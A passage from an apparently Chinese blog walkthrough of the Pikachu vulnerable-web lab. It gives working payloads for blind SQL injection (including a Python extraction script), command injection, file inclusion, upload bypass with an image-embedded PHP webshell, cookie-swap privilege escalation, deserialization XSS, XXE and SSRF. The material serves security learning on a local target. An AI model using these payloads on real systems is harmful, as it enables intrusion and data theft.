class="string">&quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=kobe&amp;submit=查询&quot;</span></span><br><span class="line">payload=<span class="string">&quot;%27+and+ascii%28substr%28database%28%29%2C&#123;0&#125;%2C1%29%29%3D&#123;1&#125;%23&quot;</span></span><br><span class="line">database=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Start to retrive the database&quot;</span>)</span><br><span class="line">b=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        p=payload.<span class="built_in">format</span>(i,j)</span><br><span class="line">        url=url1 % p</span><br><span class="line">        r=((requests.get(url)).text).find(<span class="string">&#x27;pikachu.com&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r==<span class="number">31550</span>:</span><br><span class="line">        	b=j</span><br><span class="line">    database+=<span class="built_in">chr</span>(b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the database is :%s&quot;</span> % database)</span><br></pre></td></tr></table></figure>



<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>都为盲注，利用sleep函数设定一个时长，通过页面的反应时间来判断注入语句的ascii与对应字符是否相等</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例</span><br><span class="line">kobe’ and sleep(5)#</span><br><span class="line">kobe&#39; and if ((substr(database(),1,1))&#x3D;&#39;a&#39;,sleep&#x3D;(5),null)#</span><br><span class="line">1ms就返回结果 说明不是 &quot;a&quot;一直爆破到确定数据库的全称</span><br></pre></td></tr></table></figure>

<p>注入之前可以先测试<code>kobe’ and sleep(5)#</code>若确实是5s之后页面刷新则存在时间盲注</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>抓包修改数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改name值为kobe%df&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="https://img.vim-cn.com/e6/846df244abcc61f41fcda33e1097feb2752b00.png"></p>
<p>得到回显</p>
<p><img src="https://img.vim-cn.com/cb/074c06446545c30e8107f592c961b403bdcbad.png"></p>
<p>说明存在注入</p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p><a href="http://t0mrvvi1b3t.top/2021/04/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">关于rce</a></p>
<h2 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h2><p><img src="https://img.vim-cn.com/2f/e10a700d174e68246d8443bf9c4be7b63fb42d.png"></p>
<p>利用管道符拼接命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure>

<p>就可以返回电脑的用户名</p>
<h2 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h2><p><img src="https://img.vim-cn.com/25/f221d66f3518ab84707179f7bfdf293230fb8e.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/eval">关于eval函数</a></p>
<p>执行代码 payload：<code>phpinfo();</code></p>
<p>即可看到phpinfo</p>
<h1 id="File-inclusion-文件包含"><a href="#File-inclusion-文件包含" class="headerlink" title="File inclusion( 文件包含 )"></a>File inclusion( 文件包含 )</h1><p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。                        但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击者会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。</p>
<h2 id="File-inclusion-local"><a href="#File-inclusion-local" class="headerlink" title="File inclusion( local )"></a>File inclusion( local )</h2><p>本地包含</p>
<p>随便选择一个</p>
<p><img src="https://img.vim-cn.com/8a/eb86b177acced6faa3b3d14f7ccf91e0815916.png"></p>
<p>观察url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php?filename&#x3D;file1.php&amp;submit&#x3D;提交查询</span><br></pre></td></tr></table></figure>

<p>在本地文件夹写写一个1.txt文本</p>
<p><img src="https://img.vim-cn.com/a4/dfc3100b6040eba1e2fbf2ad914076a094f1a5.png"></p>
<p>修改url</p>
<p><img src="https://img.vim-cn.com/35/ffdad9528c963cca07f828a16704aa51afa791.png"></p>
<p>成功包含</p>
<p>源码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;include/<span class="subst">$filename</span>&quot;</span>;<span class="comment">//变量传进来直接包含,没做任何的安全限制</span></span><br><span class="line"><span class="comment">//     //安全的写法,使用白名单，严格指定包含的文件名</span></span><br><span class="line"><span class="comment">//     if($filename==&#x27;file1.php&#x27; || $filename==&#x27;file2.php&#x27; || $filename==&#x27;file3.php&#x27; || $filename==&#x27;file4.php&#x27; || $filename==&#x27;file5.php&#x27;)&#123;</span></span><br><span class="line"><span class="comment">//         include &quot;include/$filename&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="File-inclusion-remote"><a href="#File-inclusion-remote" class="headerlink" title="File inclusion( remote )"></a>File inclusion( remote )</h2><p><img src="https://img.vim-cn.com/ef/2b63aa1cb083610b4a05bf84c85021c7e979cf.png"></p>
<p>找到本机的php.ini修改配置文件</p>
<p><img src="https://img.vim-cn.com/1a/9453be568c4b11e4d04f2f942105bb16d03067.png"></p>
<p>利用kali做远程主机，在/var/www/html文件夹内写入1.php</p>
<p><img src="https://img.vim-cn.com/5b/f089c4d6ee18432e87161990dab433cbe10007.png"></p>
<p>开启apache服务</p>
<p><img src="https://img.vim-cn.com/66/fb8e9954c00922faad0ae9df4ffe0a79be1c14.png"></p>
<p>修改filename的值为<a target="_blank" rel="noopener" href="http://ip/%E6%96%87%E4%BB%B6%E5%90%8D%E5%8D%B3%E5%8F%AF">http://ip/文件名即可</a></p>
<h1 id="Unsafe-filedownload"><a href="#Unsafe-filedownload" class="headerlink" title="Unsafe filedownload"></a>Unsafe filedownload</h1><p>点击下载，用bp抓包修改数据</p>
<p><img src="https://img.vim-cn.com/09/0e319baa1d8be2cb753b55efbe769b1043f777.png"></p>
<p>修改后即可下载</p>
<p><img src="https://img.vim-cn.com/76/fbba66d802377861c21a1b600adb1a423c0c1d.png"></p>
<h1 id="Unsafe-fileupload"><a href="#Unsafe-fileupload" class="headerlink" title="Unsafe fileupload"></a>Unsafe fileupload</h1><h2 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h2><p><img src="https://img.vim-cn.com/2f/c24c1abbd398499ecb192f00724d6d3da000f3.png"></p>
<p>直接上传不成功，根据名称猜测是前端限制，禁用前端js</p>
<p><img src="https://img.vim-cn.com/38/17aa302884396e7447d6e9d8608c3587ec22c3.png"></p>
<p>再次尝试上传</p>
<p><img src="https://img.vim-cn.com/a3/81bbb500bb969b2afda3f422e52b3f02e40bbf.png"></p>
<p>上传成功</p>
<p><img src="https://img.vim-cn.com/46/ed7136a521540a4689ede9361b66d547983d02.png"></p>
<h2 id="Mime-type"><a href="#Mime-type" class="headerlink" title="Mime type"></a>Mime type</h2><p>抓包修改文件类型即可</p>
<p><img src="https://img.vim-cn.com/56/ef276966936cb8da8ed5b4210f4432e57398bf.png"></p>
<p>放包</p>
<p><img src="https://img.vim-cn.com/04/e3cf0031666248e109f0d271a65d01d0e9ae87.png"></p>
<h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/andr01la/p/5146422.html">关于copy</a></p>
<p>可利用windows系统命令 <code>copy</code> 将一段php插入到图片里边</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy 2.jpg&#x2F;b+ma.php&#x2F;a 3.jpg</span><br><span class="line"></span><br><span class="line">把ma.php 插入到 2.jpg中 覆盖3.jpg</span><br></pre></td></tr></table></figure>

<p>之后上传图像文件</p>
<p> 因为打开之后是个图片，无法直接利用，通过文件包含的想法来getshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu-master&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php?filename&#x3D;..&#x2F;..&#x2F;unsafeupload&#x2F;+给出的图片路径&amp;submit&#x3D;%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p>通过蚁剑进行连接即可</p>
<h1 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h1><p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞</p>
<h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>水平越权 以一个用户来越权操作另一个用户的数据</p>
<p>右上角提示给了3个账号</p>
<p>以kobe账号水平越权lili为例</p>
<p><img src="https://img.vim-cn.com/ad/a4c0edb59a49ae0129c52e18c9ad242a2de082.png"></p>
<p>直接修改一下username的值发现返回lili的信息</p>
<h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips：这里有两个用户admin&#x2F;123456,pikachu&#x2F;000000,admin是超级boss</span><br></pre></td></tr></table></figure>

<p>那就是用pikachu来越权admin了</p>
<p>先登录pikachu账号，发现只有查看权限</p>
<p><img src="https://img.vim-cn.com/41/0edfe03e10a2708faf7916cbe5f04740f124a0.png"></p>
<p>登陆admin账号，发现有添加用户的权限，添加一个用户并抓包发送至repeater模块</p>
<p>退出admin，登陆pikachu，再次抓包获取pikachu的cookie</p>
<p>登陆后发现了刚刚添加的hhh用户</p>
<p><img src="https://img.vim-cn.com/fa/c52643ea0720586e2673fc70c10f46132d8cc9.png"></p>
<p>这时转到bp，用刚刚复制的pikachu的cookie来替换admin的cookie，并修改一下用户信息，点击send</p>
<p>刷新界面就可以看到新增的用户abc了</p>
<p><img src="https://img.vim-cn.com/99/a93fc7fe0b0674f73e2c477b8ab50422eac81c.png"></p>
<h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="../../( 目录遍历 )"></a>../../( 目录遍历 )</h1><p><img src="https://img.vim-cn.com/fa/5caf8b25132971c3641b8b470c5b71a60828f9.png"></p>
<p>观察概述的url</p>
<p><img src="https://img.vim-cn.com/92/381e4d9f45d213954b5ceb553edc33ea2e93f6.png"></p>
<p>点击1 可以看到对应的url</p>
<p>把title的值修改为<code>../dir.php</code>即可转到概述界面</p>
<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p>
<h2 id="icanseeyourABC"><a href="#icanseeyourABC" class="headerlink" title="icanseeyourABC"></a>icanseeyourABC</h2><p>先查看源代码，发现里一个注释</p>
<p><img src="https://img.vim-cn.com/de/f83af66764569764b89669949e237f189a84fc.png"></p>
<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p><strong>序列化serialize()</strong><br>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:            </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> S(); <span class="comment">//创建一个对象</span></span><br><span class="line">serialize(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line">序列化后得到的结果是这个样子的:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line">    O:代表<span class="keyword">object</span></span><br><span class="line">    <span class="number">1</span>:代表对象名字长度为一个字符</span><br><span class="line">    S:对象的名称</span><br><span class="line">    <span class="number">1</span>:代表对象里面有一个变量</span><br><span class="line">    s:数据类型</span><br><span class="line">    <span class="number">4</span>:变量名称的长度</span><br><span class="line">    test:变量名称</span><br><span class="line">    s:数据类型</span><br><span class="line">    <span class="number">7</span>:变量值的长度</span><br><span class="line">    pikachu:变量值</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>反序列化unserialize()</strong></p>
<p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$u</span>=unserialize(<span class="string">&quot;O:1:&quot;</span>S<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:7:&quot;</span>pikachu<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test; <span class="comment">//得到的结果为pikachu</span></span><br></pre></td></tr></table></figure>

<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">漏洞举例:</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">@<span class="variable">$unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">payload:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>payload：<code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code></p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><code>xml外部实体注入漏洞</code></p>
<p>就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>
<p>tips：先把XML声明、DTD文档类型定义、文档元素这些基础知识自己看一下</p>
<p><code>payload：&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY hacker &quot;xxe&quot;&gt; ]&gt; &lt;name&gt;&amp;hacker;&lt;/name&gt;</code></p>
<p><img src="https://img.vim-cn.com/c3/635e0fe9aa8b0a38b868251ad57841094e1702.png"></p>
<h1 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h1><p>有4个超链接</p>
<p><img src="https://img.vim-cn.com/8c/b149c61e557813a7bc2e5e40911f219538b917.png"></p>
<p>可以修改第三个和第四个的url的值（修改为某个网址的url）来实现网页跳转</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p>
<p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制</p>
<p>​            导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
<p>​            数据流:攻击者—–&gt;服务器—-&gt;目标地址</p>
<p>​            根据后台使用的函数的不同,对应的影响和利用方法又有不一样            </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF( curl )"></a>SSRF( curl )</h2><p><img src="https://img.vim-cn.com/d7/5eac2b9f9c8051751e22667ed1545c31a552e7.png"></p>
<p>点击链接</p>
<p><img src="https://img.vim-cn.com/11/00492eb830ce580aca87eb342c41a5267c28cb.png"></p>
<p>修改一下url即可实现跳转（改为百度的地址</p>
<p><img src="https://img.vim-cn.com/95/d6600cb6eeaf58998dd8dc77194adcc7281ff3.png"></p>
<p>success！</p>
<h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF( file_get_content )"></a>SSRF( file_get_content )</h2><p>1、与上一个方法相同</p>
<p>2、也可以利用这个修改file值读取到网页源码</p>
<p><code>payload：?file=php://filter/read=convert.base64-encode/resource=ssrf.php</code></p>
<p>会发现源码以base64编码的形式出现在了页面下边，进行解码即可看到源码（太长了就不放了</p>
<hr>
<p>历时3天终于完事儿了，一直抽空在搞这个，考虑把web从一个大框架上来整体看一下，重新开始有目的的去学一下，靶场内的都是没有过滤的简单的漏洞复现，过几天会找一下相关比赛题目来复现一下。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">T0mrvvi1b3t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://t0mrvvi1b3t.top/2021/05/18/pikachu/">http://t0mrvvi1b3t.top/2021/05/18/pikachu/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://t0mrvvi1b3t.top" target="_blank">T0mrvvi1b3t‘s blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://img.vim-cn.com/68/479ea06dd82108a050b701991f8405aa76bbbe.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/05/20/pico21/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1627968823542-1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">picoctf forensics</div></div></a></div><div class="next-post pull-right"><a href="/2021/05/15/ctfhub_.git/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1627968854214-3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctfhub 技能树 .git泄露</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://ss2.baidu.com/6ON1bjeh1BF3odCf/it/u=2706720867,592915881&amp;fm=27&amp;gp=0.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">T0mrvvi1b3t</div><div class="author-info__description">i have a big dream.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50597969"><i class="fab fa-csdn"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:t0mrvvi1b3t@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">Nothing!!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">基于表单的暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">验证码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#on-client"><span class="toc-number">1.2.1.</span> <span class="toc-text">on client</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#on-server"><span class="toc-number">1.2.2.</span> <span class="toc-text">on server</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-Site-Scripting-%E2%80%93-XSS"><span class="toc-number">2.</span> <span class="toc-text">Cross-Site Scripting – XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get"><span class="toc-number">2.1.</span> <span class="toc-text">反射型xss( get )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-post"><span class="toc-number">2.2.</span> <span class="toc-text">反射型xss( post )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">2.3.</span> <span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8Bxss"><span class="toc-number">2.4.</span> <span class="toc-text">DOM型xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8Bxss-x"><span class="toc-number">2.5.</span> <span class="toc-text">DOM型xss-x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="toc-number">2.6.</span> <span class="toc-text">XSS之盲打</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-number">2.7.</span> <span class="toc-text">XSS之过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8Bhtmlspecialchars"><span class="toc-number">2.8.</span> <span class="toc-text">XSS之htmlspecialchars</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="toc-number">2.9.</span> <span class="toc-text">XSS之href输出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Ejavascript%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">2.9.1.</span> <span class="toc-text">关于javascript伪协议：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="toc-number">2.10.</span> <span class="toc-text">XSS之js输出</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">3.0.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.0.2.</span> <span class="toc-text">探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8EXSS%E5%8C%BA%E5%88%AB"><span class="toc-number">3.0.3.</span> <span class="toc-text">与XSS区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-get"><span class="toc-number">3.1.</span> <span class="toc-text">CSRF( get )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-post"><span class="toc-number">3.2.</span> <span class="toc-text">CSRF( post )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-Token"><span class="toc-number">3.3.</span> <span class="toc-text">CSRF( Token )</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">3.3.1.</span> <span class="toc-text">防范措施</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sql-Inject-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">Sql Inject(SQL注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-post"><span class="toc-number">4.1.</span> <span class="toc-text">数字型注入( post )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-get"><span class="toc-number">4.2.</span> <span class="toc-text">字符型注入( 